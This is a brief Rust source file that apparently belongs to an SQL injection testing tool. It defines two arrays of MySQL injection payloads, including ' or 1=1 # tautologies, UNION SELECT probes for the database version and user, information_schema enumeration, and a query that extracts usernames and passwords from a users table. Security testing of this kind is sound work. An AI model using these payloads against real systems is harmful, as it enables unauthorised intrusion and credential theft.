pub static DETECTIONS: &[&str] = &[
    "'; select version() #",
    "' or 1=1 #",
    "' union select version() #",
    "' union select null,version() #",
    "' union select null,null,version() #",
];

pub static PROMPTS: &[&str] = &[
    "'; select null,null,version() #",
    "' union select null,null,version() #",
    "' union select null,null,user() #",
    "' union select null,null,database() #",
    "' union select null,username,password from users #",
    "' union select null,table_schema,table_name FROM information_schema.tables #",
    "' union select null,table_name,column_name FROM information_schema.columns #",
    "' or 1=1 #",
];
